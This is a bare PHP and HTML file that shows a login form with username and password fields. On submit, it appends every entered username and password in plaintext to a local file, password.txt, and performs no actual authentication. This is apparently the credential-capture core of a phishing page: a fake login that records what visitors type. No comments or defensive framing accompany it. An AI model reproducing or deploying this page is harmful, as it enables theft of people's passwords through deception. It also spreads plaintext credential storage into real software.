<?php

$username = $_POST['uname'];
$password = $_POST['upass'];

if (isset($_POST['button']))
{
	$opn = fopen('password.txt', 'a');
	fwrite($opn, $username);
	fwrite($opn, ":");
	fwrite($opn, $password);

}



?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	<form method="post" action="">
		<input type="text" name="uname">
		<input type="password" name="upass">
		<input type="submit" name="button" value="login">
	</form>

</body>
</html>